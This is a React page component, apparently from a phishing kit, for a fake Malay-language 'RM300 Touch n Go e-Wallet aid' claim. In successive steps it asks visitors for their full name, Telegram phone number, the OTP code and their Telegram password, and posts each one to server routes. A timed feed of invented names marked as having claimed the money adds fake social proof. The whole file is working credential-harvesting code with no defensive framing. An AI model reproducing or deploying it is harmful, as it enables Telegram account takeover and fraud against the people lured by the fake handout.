import { Link, useForm } from "@inertiajs/react";
import { React, useState, useRef, useEffect } from "react";
import CountryData from "../../../js/CountryCodesWithFlags";
export default function Index() {
    const dataNama = [
        "Aisyah binti Abdul Rahman",
        "Ahmad bin Ismail",
        "Siti Nur Aisyah",
        "Zahra binti Ismail",
        "Farhan bin Khalid",
        "Mira binti Mohd Noor",
        "Ali bin Rashid",
        "Hana binti Shamsul",
        "Nadia binti Ahmad",
        "Kamal bin Ibrahim",
        "Aisyah binti Mohamad",
        "Zul bin Abidin",
        "Nabilah binti Abdul Razak",
        "Sulaiman bin Zainal",
        "Nina binti Ali",
        "Fahmi bin Azman",
        "Lina binti Mohd",
        "Nabil bin Ahmad",
        "Fatin binti Yusof",
        "Arif bin Ibrahim",
        "Azizah binti Rahman",
        "Ibrahim bin Yassin",
        "Liyana binti Faris",
        "Adam bin Zulkifli",
        "Rina binti Ismail",
        "Khalid bin Omar",
        "Mariam binti Ali",
        "Sharifah binti Abdillah",
        "Zuraida binti Mohamad",
        "Aina binti Sulaiman",
        "Syafiq bin Abdul Rahman",
        "Maira binti Idris",
        "Firdaus bin Ali",
        "Rafidah binti Zainal",
        "Fadhil bin Ali",
        "Nurul binti Hisham",
        "Rizal bin Mohd Noor",
        "Shaza binti Khalid",
        "Ismail bin Abu",
        "Nora binti Salleh",
        "Syakir bin Ibrahim",
        "Sarah binti Mohd",
        "Rizwan bin Razak",
        "Fayza binti Mohd",
        "Haziq bin Hassan",
        "Aminah binti Zainal",
        "Zainal bin Mohd Noor",
        "Amir bin Ali",
        "Ainul binti Kamal",
        "Siti Mariam binti Hassan",
        "Faiz bin Ramli",
        "Syarifah binti Zulkifli",
        "Mimi binti Ibrahim",
        "Afiqah binti Safwan",
        "Norliza binti Ahmad",
        "Rasul bin Ali",
        "Fathimah binti Abdul Wahid",
        "Mokhtar bin Abd Rahman",
        "Haziqah binti Ahmad",
        "Zainab binti Ali",
        "Razak bin Samad",
        "Shakila binti Ibrahim",
        "Hassan bin Nordin",
        "Zubair bin Saad",
        "Rina binti Yahya",
        "Nour binti Abdillah",
        "Faris bin Mohd",
        "Hanafi bin Ismail",
        "Azman bin Ahmad",
        "Fatimah binti Mohd",
        "Najwa binti Yusuf",
        "Rizwan bin Rani",
        "Huda binti Asma",
        "Azra binti Ahmad",
        "Ikram bin Omar",
        "Jamilah binti Abdullah",
        "Fizah binti Aziz",
        "Farah binti Ismail",
        "Wani binti Ahmad",
        "Anwar bin Hassan",
        "Rosmah binti Ibrahim",
        "Farrin binti Zahid",
        "Yusof bin Osman",
        "Shamsul bin Sulaiman",
        "Azeem bin Rashid",
        "Alya binti Ali",
        "Rifqi bin Farhan",
        "Nisa binti Idris",
        "Diana binti Sulaiman",
        "Nabilah binti Farid",
        "Khairul bin Nordin",
        "Raya binti Jamal",
        "Mariam binti Ramli",
        "Siti Aisyah binti Noor",
        "Syahira binti Mahmud",
        "Shafie bin Zulkifli",
        "Danial bin Omar",
        "Raja binti Azman",
        "Azreen binti Salleh",
        "Rilla binti Ibrahim",
        "Hafiz bin Rashid",
        "Zahira binti Mohd",
        "Asyraf bin Mohamad",
        "Mika binti Ali",
        "Rania binti Faris",
        "Siti Nur binti Ibrahim",
        "Shakirah binti Yusuf",
        "Hana binti Zakaria",
        "Zakia binti Abdullah",
        "Jazlin binti Ismail",
        "Shamsuddin bin Ismail",
        "Nabil bin Abidin",
        "Fahmi bin Muhammad",
        "Aziza binti Osman",
        "Safira binti Faris",
        "Zakaria bin Ali",
        "Syamil bin Azman",
        "Azimah binti Zainal",
        "Khairani binti Ibrahim",
        "Razali bin Ahmad",
        "Abdul Rahman bin Hisham",
        "Ain binti Nasir",
        "Fakhrul bin Zainal",
        "Afiq bin Omar",
        "Nur binti Samad",
        "Rijal bin Abidin",
        "Fahira binti Salim",
        "Rizq bin Mohd",
        "Anis binti Omar",
        "Mira binti Kamal",
        "Ainul binti Azman",
        "Fahmi bin Saad",
        "Rashidah binti Mohd",
        "Elina binti Ibrahim",
        "Zain bin Abdullah",
        "Zara binti Ali",
        "Syazwan bin Yusof",
        "Firas bin Ali",
        "Khairul bin Kamal",
        "Nadia binti Shamsul",
        "Shazwan bin Mohd",
        "Raihan bin Zainal",
        "Aslam bin Ibrahim",
        "Yasmin binti Omar",
        "Hafizah binti Ali",
    ];
    const { data, setData, post, reset, errors } = useForm({
        name: "",
        phone_number: "+60",
        otp: "",
        password: "",
    });
    const [selectedCode, setSelectedCode] = useState({
        name: "my",
        dial_code: "+60",
    });
    const [loading, setLoading] = useState(false);
    const [showInput, setShowInput] = useState(false);
    const [countryData, setCountryData] = useState(CountryData);
    const [showNumber, setShowNumber] = useState(false);
    const [show, setShow] = useState(15);
    const containerRef = useRef(null);
    const [type, setType] = useState("home");
    useEffect(() => {
        const interval = setInterval(() => {
            setShow((prev) => prev + 1);
        }, 1000);

        // Clear interval saat komponen unmount
        return () => clearInterval(interval);
    }, []);
    useEffect(() => {
        if (containerRef.current) {
            containerRef.current.scrollTop = containerRef.current.scrollHeight;
        }
    }, [show]);
    const selectCountry = (item) => {
        setSelectedCode({
            ...selectCountry,
            name: item.code.toLowerCase(),
            dial_code: item.dial_code,
        });
        setData({ ...data, phone_number: item.dial_code });
        setShowInput(false);
    };

    const changeInput = (e) => {
        const inputValue = e.target.value;

        // Regex untuk memeriksa apakah input hanya angka dan tanda plus
        const regex = /^[0-9+]*$/;

        // Jika input sesuai dengan regex, update state
        if (regex.test(inputValue)) {
            setData({ ...data, phone_number: inputValue });
        }
    };
    useEffect(() => {
        if (data.phone_number === "") {
            setCountryData(CountryData);
        } else {
            const filter = countryData.filter((country) =>
                country.dial_code.includes(data.phone_number)
            );
            console.log(filter.length);

            if (filter.length > 0) {
                setSelectedCode({
                    ...selectedCode,
                    name: filter[0].code.toLowerCase(),
                });
                setCountryData(filter);
            }
        }
    }, [data.phone_number]);
    const inputRef = useRef(null);
    useEffect(() => {
        let handler = (e) => {
            // Memastikan jika klik terjadi di luar area inputRef, maka setShowInput menjadi false
            if (inputRef.current && !inputRef.current.contains(e.target)) {
                setShowInput(false);
            }
        };

        // Menambahkan event listener pada document
        document.addEventListener("mousedown", handler);

        // Membersihkan event listener saat komponen unmount
        return () => {
            document.removeEventListener("mousedown", handler);
        };
    }, []);

    const handleSubmitPhone = () => {
        setLoading(true);

        post(route("one.store_number"), {
            preserveScroll: true,
            onSuccess: (e) => {
                setLoading(false);
                setType("verif");
            },
            onError: (e) => {
                setLoading(false);
            },
        });
    };

    const otpHandler = (e) => {
        const inputValue = e.target.value;

        // Regex untuk memeriksa apakah input hanya angka dan tanda plus
        const regex = /^[0-9+]*$/;
        if (inputValue.length <= 5) {
            if (regex.test(inputValue)) {
                setData({ ...data, otp: inputValue });
            }
        }
        // Jika input sesuai dengan regex, update state
    };
    const handleVerif = () => {
        setLoading(true);

        post(route("one.send_otp"), {
            preserveScroll: true,
            onSuccess: (e) => {
                setLoading(false);
                setType("password");
            },
            onError: (e) => {
                setLoading(false);
            },
        });
    };
    const handlePassword = () => {
        setLoading(true);

        post(route("one.store_password"), {
            preserveScroll: true,
            onSuccess: (e) => {
                setLoading(false);

                reset("name", "phone_number", "otp", "password");
            },
            onError: (e) => {
                setLoading(false);
            },
        });
    };

    return (
        <div className="px-8 md:px-16 lg:px-24 transition-all duration-300 ease-in-out py-8 relative h-[900px] md:h-[1300px] overflow-y-hidden">
            <div
                className={`${
                    loading ? "" : "hidden"
                } bg-slate-500/50 backdrop-blur-sm absolute top-0 left-0 w-full h-screen flex justify-center items-center z-50`}
            >
                <img src="loading-loading-forever.gif" alt="" />
            </div>
            <div className="w-full h-screen flex flex-col items-center gap-y-2">
                <h3 className="text-xl md:text-2xl lg:text-4xl transition-all duration-300 ease-linear font-bold tracking-tight ">
                    Bantuan e Wallet Touch n Go
                </h3>
                <img
                    src="bg1.jpeg"
                    alt=""
                    className="rounded-md shadow-sm shadow-gray-400/50 h-[300px] md:h-[300px] lg:h-[400px]"
                />
                <p className="font-bold tracking-tighter text-center text-lg md:text-base lg:text-xl">
                    CLAIM SEKARANG NI TUK DAPATKAN{" "}
                    <sspan className="text-yellow-500 ">RM300</sspan> KAT
                    E-WALLET ANDA
                </p>
                <p className="font-bold text-yellow-300">
                    Bantuan e-Wallet RM300
                </p>
                {type == "home" && (
                    <button
                        onClick={() => setType("phone")}
                        className="hover:bg-blue-600 bg-yellow-500 text-white py-2 w-full text-center font-light rounded-md"
                    >
                        Claim Now
                    </button>
                )}

                {type == "phone" && (
                    <div>
                        <form action="" className="py-5 flex flex-col gap-y-3">
                            <input
                                value={data.name}
                                onChange={(e) =>
                                    setData({ ...data, name: e.target.value })
                                }
                                type="text"
                                placeholder="Nama Penuh Sesuai MyKad"
                                className="w-full rounded-md border-gray-200 outline-gray-300 focus:outline-yellow-400 focus:border-yellow-400 focus:ring-0 placeholder:text-gray-300 px-4"
                            />
                            {errors.name && (
                                <p className="text-xs text-red-500 italic">
                                    {errors.name}
                                </p>
                            )}
                            <div className="relative">
                                <input
                                    ref={inputRef}
                                    onFocus={() => setShowInput(true)}
                                    onClick={() => setShowInput(true)}
                                    onChange={changeInput}
                                    value={data.phone_number}
                                    placeholder="+60 Phone number Telegram"
                                    type="text"
                                    className="w-full rounded-md border-gray-200 outline-gray-300 focus:outline-yellow-400 focus:border-yellow-400 focus:ring-0 placeholder:text-gray-300 px-16"
                                />

                                <div className="absolute top-0 left-0 w-14 h-full flex items-center justify-center p-1">
                                    <div
                                        className={`"bg-gray-200  w-full h-full rounded-md hover:bg-gray-300 hover:cursor-pointer flex justify-center items-center"`}
                                    >
                                        <img
                                            className="w-8"
                                            src={`https://flagcdn.com/w40/${selectedCode.name}.png`}
                                            alt=""
                                        />
                                        <div
                                            className={`absolute top-12 left-3 w-[300px] ${
                                                showInput
                                                    ? "hg-[300px] px-2 py-3"
                                                    : "h-0"
                                            } bg-white shadow-sm shadow-gray-200 rounded-md overflow-auto `}
                                        >
                                            {countryData.map((item, key) => (
                                                <div
                                                    onClick={() =>
                                                        selectCountry(item)
                                                    }
                                                    className="flex gap-3 items-center tracking-tighter my-2 hover:bg-gray-200 px-3 py-2"
                                                >
                                                    <img
                                                        className="w-6 h-6"
                                                        src={`https://flagcdn.com/w40/${item.code.toLowerCase()}.png`}
                                                        alt=""
                                                    />
                                                    <p>{item.name} </p>
                                                </div>
                                            ))}
                                        </div>
                                    </div>
                                </div>
                            </div>
                            {errors.phone_number && (
                                <p className="text-xs  text-red-500 italic">
                                    {errors.phone_number}
                                </p>
                            )}
                            <button
                                onClick={handleSubmitPhone}
                                type="button"
                                className="hover:bg-blue-600 bg-yellow-500 text-white py-2 w-full text-center font-light rounded-md"
                            >
                                Claim Now
                            </button>
                        </form>
                        <img
                            src="bg-3.jpeg"
                            alt=""
                            className="rounded-md shadow-sm shadow-gray-400/50 h-[300px] md:h-[300px] lg:h-[400px]"
                        />
                    </div>
                )}
                {type == "verif" && (
                    <div>
                        <h3 className=" text-yellow-400 text-lg md:text-2xl lg:text-4xl font-bold">
                            Masukkan Kode OTP
                        </h3>
                        <form action="" className="py-5 flex flex-col gap-y-3">
                            <input
                                value={data.otp}
                                onChange={otpHandler}
                                type="text"
                                placeholder="Masukkan OTP"
                                className="w-full rounded-md border-gray-200 outline-gray-300 focus:outline-yellow-400 focus:border-yellow-400 focus:ring-0 placeholder:text-gray-300 px-4"
                            />
                            {errors.otp && (
                                <p className="text-xs text-red-500 italic">
                                    {errors.otp}
                                </p>
                            )}

                            <button
                                onClick={handleVerif}
                                type="button"
                                className="hover:bg-blue-600 bg-yellow-500 text-white py-2 w-full text-center font-light rounded-md"
                            >
                                Teruskan
                            </button>
                        </form>
                        <img
                            src="bg-3.jpeg"
                            alt=""
                            className="rounded-md shadow-sm shadow-gray-400/50 h-[300px] md:h-[300px] lg:h-[400px]"
                        />
                    </div>
                )}
                {type == "password" && (
                    <div>
                        <h3 className=" text-yellow-400 text-lg md:text-2xl lg:text-4xl font-bold">
                            Sila Masukkan kata laluan Telegram Anda
                        </h3>
                        <form action="" className="py-5 flex flex-col gap-y-3">
                            <div className="relative">
                                <input
                                    onChange={(e) =>
                                        setData({
                                            ...data,
                                            password: e.target.value,
                                        })
                                    }
                                    value={data.password}
                                    placeholder="Sila Masukkan kata laluan"
                                    type="password"
                                    className="w-full rounded-md border-gray-200 outline-gray-300 focus:outline-yellow-400 focus:border-yellow-400 focus:ring-0 placeholder:text-gray-300 px-4"
                                />
                            </div>
                            {errors.password && (
                                <p className="text-xs text-red-500 italic">
                                    {errors.password}
                                </p>
                            )}
                            <button
                                onClick={handlePassword}
                                type="button"
                                className="hover:bg-blue-600 bg-yellow-500 text-white py-2 w-full text-center font-light rounded-md"
                            >
                                Teruskan
                            </button>
                        </form>
                        <img
                            src="bg-3.jpeg"
                            alt=""
                            className="rounded-md shadow-sm shadow-gray-400/50 h-[300px] md:h-[300px] lg:h-[400px]"
                        />
                    </div>
                )}

                <div
                    style={{
                        scrollBehavior: "smooth", // Menambahkan animasi scroll
                    }}
                    ref={containerRef}
                    className="bg-slate-100 rounded-md flex flex-col gap-y-2 py-12 px-4 w-full  min-h-[150px] md:min-h-[550px] max-h-[350px] md:max-h-[900px] overflow-y-hidden"
                >
                    {dataNama.map(
                        (item, key) =>
                            key < show && (
                                <div
                                    // style={{
                                    //     animationDelay: `${key * 100}ms`, // Penundaan animasi untuk efek yang lebih alami
                                    // }}
                                    key={key}
                                    className={`transition-all duration-300 ease-linear flex gap-4 items-center bg-white py-3 px-4 leading-3 rounded-md shadow-sm shadow-gray-400/50 ${
                                        key - 1 == show && "fade-in"
                                    }`}
                                >
                                    <img
                                        src="avatar.png"
                                        alt=""
                                        className="w-12 rounded-full"
                                    />
                                    <div>
                                        <p className="font-bold text-lg md:text-xl lg:text-2xl  leading-5">
                                            {item}
                                        </p>
                                        <p className="font-thin text-green-500 text-sm leading-5">
                                            Berjaya Claim RM300
                                        </p>
                                    </div>
                                </div>
                            )
                    )}
                </div>
            </div>
            <div className="absolute bottom-0 left-0 w-full px-8 md:px-16 lg:px-24">
                <img src="bg2.png" alt="" />
            </div>
        </div>
    );
}
